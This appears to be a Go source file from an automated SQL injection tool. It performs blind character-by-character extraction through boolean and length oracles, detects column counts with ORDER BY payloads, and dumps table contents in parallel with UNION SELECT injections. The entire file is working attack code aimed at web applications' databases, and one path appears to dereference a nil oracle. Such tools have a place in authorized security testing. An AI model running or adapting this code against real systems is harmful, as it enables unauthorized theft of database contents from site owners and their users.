package core

import (
	"fmt"
	"strings"
	"sync"
	"time"
)

type CharResult struct {
	Pos   int
	Char  byte
	Found bool
	Err   error
}

type oracleType int

const (
	oracleBoolean  oracleType = iota
	oracleLength
	oracleError
	oracleTime
)

type ExtractOracle struct {
	Type          oracleType
	BaseBody      string
	BaseLen       int
	TrueBody      string
	FalseBody     string
	TrueLen       int
	FalseLen      int
	BaseTime      time.Duration
	TrueTemplate  string
	FalseTemplate string
	TimeTemplate  string
	ErrorPatterns []string
}

func (e *Engine) setupBooleanOracle(param string, trueTemplate, falseTemplate string) *ExtractOracle {
	o := &ExtractOracle{Type: oracleBoolean}

	baseBody, _, _, err := e.Request("", "")
	if err != nil {
		return o
	}
	o.BaseBody = baseBody
	o.BaseLen = len(baseBody)

	trueBody, trueLen, _, err := e.Request(trueTemplate, param)
	if err == nil {
		o.TrueBody = trueBody
		o.TrueLen = trueLen
	}

	falseBody, falseLen, _, err := e.Request(falseTemplate, param)
	if err == nil {
		o.FalseBody = falseBody
		o.FalseLen = falseLen
	}

	return o
}

func (e *Engine) setupLengthOracle(param string) *ExtractOracle {
	o := &ExtractOracle{Type: oracleLength}
	body, _, _, err := e.Request("", "")
	if err != nil {
		return o
	}
	o.BaseBody = body
	o.BaseLen = len(body)
	return o
}

func (e *Engine) testCharWithBooleanOracle(o *ExtractOracle, param, template string, pos, mid int) (bool, error) {
	payload := fmt.Sprintf(template, pos, mid)
	body, bodyLen, _, err := e.Request(payload, param)
	if err != nil {
		return false, err
	}
	_ = bodyLen

	if o.TrueBody != "" && o.FalseBody != "" {
		diffTrue := stringDiff(body, o.TrueBody)
		diffFalse := stringDiff(body, o.FalseBody)
		if diffTrue < diffFalse {
			return true, nil
		}
		return false, nil
	}

	if bodyLen > o.BaseLen+50 {
		return true, nil
	}
	return false, nil
}

func (e *Engine) testCharWithLengthOracle(o *ExtractOracle, param, template string, pos, mid int) (bool, error) {
	payload := fmt.Sprintf(template, pos, mid)
	body, bodyLen, _, err := e.Request(payload, param)
	if err != nil {
		return false, err
	}
	_ = body
	if bodyLen > o.BaseLen+50 {
		return true, nil
	}
	return false, nil
}

func (e *Engine) BinarySearchCharMulti(param string, queryTemplate string, pos int, oracle *ExtractOracle, ch chan<- CharResult) {
	low, high := 32, 126
	timeout := 30 * time.Second

	for low <= high {
		mid := (low + high) / 2

		bodyCh := make(chan struct {
			bodyLen int
			body    string
			err     error
		}, 1)

		go func() {
			body, bodyLen, _, err := e.Request(fmt.Sprintf(queryTemplate, pos, mid), param)
			bodyCh <- struct {
				bodyLen int
				body    string
				err     error
			}{bodyLen, body, err}
		}()

		var result struct {
			bodyLen int
			body    string
			err     error
		}
		select {
		case result = <-bodyCh:
		case <-time.After(timeout):
			ch <- CharResult{Err: fmt.Errorf("timeout on char %d position %d", pos, mid)}
			return
		}

		if result.err != nil {
			ch <- CharResult{Err: result.err}
			return
		}

		var matched bool
		if oracle != nil && oracle.Type == oracleBoolean && oracle.TrueBody != "" {
			diffTrue := stringDiff(result.body, oracle.TrueBody)
			diffFalse := stringDiff(result.body, oracle.FalseBody)
			matched = diffTrue < diffFalse
		} else {
			matched = result.bodyLen > oracle.BaseLen+30
		}

		if matched {
			low = mid + 1
		} else {
			high = mid - 1
		}
	}

	if low >= 32 && low <= 126 {
		ch <- CharResult{Pos: pos, Char: byte(low), Found: true}
	} else {
		ch <- CharResult{Pos: pos, Found: false}
	}
}

func stringDiff(a, b string) float64 {
	if len(a) == 0 && len(b) == 0 {
		return 0
	}
	maxLen := len(a)
	if len(b) > maxLen {
		maxLen = len(b)
	}
	if maxLen == 0 {
		return 0
	}
	diffs := 0
	minLen := len(a)
	if len(b) < minLen {
		minLen = len(b)
	}
	for i := 0; i < minLen; i++ {
		if a[i] != b[i] {
			diffs++
		}
	}
	diffs += maxLen - minLen
	return float64(diffs) / float64(maxLen)
}

func (e *Engine) FastBlindExtract(param string, queryTemplate string, maxLen int) string {
	return e.FastBlindExtractWithOracle(param, queryTemplate, maxLen, nil)
}

func (e *Engine) FastBlindExtractWithOracle(param string, queryTemplate string, maxLen int, oracle *ExtractOracle) string {
	var wg sync.WaitGroup
	ch := make(chan CharResult, maxLen)
	sem := make(chan struct{}, 15)
	timeout := time.After(8 * time.Minute)
	done := make(chan struct{})

	posChars := make(map[int]byte)
	nullRun := 0
	maxNullRun := 8

	go func() {
		for i := 1; i <= maxLen; i++ {
			select {
			case <-done:
				return
			default:
			}

			wg.Add(1)
			sem <- struct{}{}
			go func(pos int) {
				defer wg.Done()
				defer func() { <-sem }()
				e.BinarySearchCharMulti(param, queryTemplate, pos, oracle, ch)
			}(i)
		}
		wg.Wait()
		close(ch)
	}()

	collectDone := make(chan struct{})
	go func() {
		for res := range ch {
			if res.Found {
				posChars[res.Pos] = res.Char
				e.Log.Debug(fmt.Sprintf("char %d: '%c' (0x%02x)", res.Pos, res.Char, res.Char))
				nullRun = 0
			} else if res.Err == nil {
				nullRun++
				if nullRun >= maxNullRun {
					close(done)
					break
				}
			}
		}
		close(collectDone)
	}()

	select {
	case <-collectDone:
	case <-timeout:
		e.Log.Warning("blind extraction timed out, using partial results")
	}

	var result strings.Builder
	for i := 1; i <= maxLen; i++ {
		if c, ok := posChars[i]; ok {
			result.WriteByte(c)
		}
	}
	return result.String()
}

func (e *Engine) DetectColumnCount(param string, dbms string) int {
	baseBody, baseLen, _, err := e.Request("", "")
	if err != nil {
		return 0
	}
	_ = baseBody

	commentStyles := []string{"-- ", "--+", "--", "#", "/*", ";"}
	prefixes := []string{"' ORDER BY ", "\" ORDER BY ", ") ORDER BY ", "' ORDER BY "}

	for _, comment := range commentStyles {
		for _, prefix := range prefixes {
			for cols := 1; cols <= 25; cols++ {
				payload := fmt.Sprintf("%s%d %s", prefix, cols, comment)
				body, bodyLen, _, err := e.Request(payload, param)
				if err != nil {
					continue
				}
				_ = body

				errKeywords := []string{"error", "order", "unknown column", "syntax", "mysql_fetch",
					"mariadb", "mysql", "postgresql", "sqlite", "sql server", "incorrect",
					"unclosed", "warning"}
				isErr := false
				for _, kw := range errKeywords {
					if strings.Contains(strings.ToLower(body), kw) {
						isErr = true
						break
					}
				}

				if isErr || (bodyLen > 0 && bodyLen < baseLen-80) {
					if cols > 1 {
						e.Log.Debug(fmt.Sprintf("ORDER BY: columns=%d (failed at %d, comment=%s, prefix=%s)", cols-1, cols, comment, prefix))
						return cols - 1
					}
				}

				if bodyLen > 0 && bodyLen == baseLen {
					if cols >= 20 {
						e.Log.Debug(fmt.Sprintf("ORDER BY: columns=%d (no error at %d)", cols, cols))
						return cols
					}
				}
			}
		}
	}

	return 0
}

func (e *Engine) BulkExtractSmart(param string, dbms string, db string, tables []string, columns []string) []map[string]string {
	results := []map[string]string{}
	colCount := e.DetectColumnCount(param, dbms)
	if colCount < 1 {
		e.Log.Warning("could not detect column count for UNION extraction")
		return results
	}

	e.Log.Debug(fmt.Sprintf("detected %d columns for UNION extraction", colCount))

	comment := "-- "
	if dbms == "PostgreSQL" {
		comment = "--"
	} else if strings.Contains(dbms, "Oracle") {
		comment = "--"
	}

	sem := make(chan struct{}, 10)
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, table := range tables {
		for _, col := range columns {
			wg.Add(1)
			sem <- struct{}{}
			go func(t, c string) {
				defer wg.Done()
				defer func() { <-sem }()

				nulls := make([]string, colCount)
				for j := range nulls {
					nulls[j] = "NULL"
				}

				for dataPos := 0; dataPos < colCount; dataPos++ {
					nulls[dataPos] = c

					unionSQL := fmt.Sprintf("' UNION SELECT %s FROM %s.%s %s",
						strings.Join(nulls, ","), db, t, comment)

					body, bodyLen, _, err := e.Request(unionSQL, param)
					if err != nil {
						nulls[dataPos] = "NULL"
						continue
					}

					if bodyLen > 100 {
						data := strings.TrimSpace(body)
						if len(data) > 50 && len(data) < 100000 {
							mu.Lock()
							results = append(results, map[string]string{
								"table":  t,
								"column": c,
								"data":   data[:minInt(len(data), 2000)],
							})
							mu.Unlock()
							nulls[dataPos] = "NULL"
							return
						}
					}
					nulls[dataPos] = "NULL"
				}
			}(table, col)
		}
	}
	wg.Wait()

	e.Log.Debug(fmt.Sprintf("smart bulk extract: %d values", len(results)))
	return results
}

func (e *Engine) ExtractWithTimeout(param string, payloads []string, timeout time.Duration) string {
	resultCh := make(chan string, len(payloads))

	for _, p := range payloads {
		go func(pay string) {
			body, _, _, err := e.Request(pay, param)
			if err != nil {
				resultCh <- ""
				return
			}
			resultCh <- body
		}(p)
	}

	best := ""
	timer := time.After(timeout)
	for i := 0; i < len(payloads); i++ {
		select {
		case body := <-resultCh:
			if len(body) > len(best) {
				best = body
			}
		case <-timer:
			return best
		}
	}

	return best
}
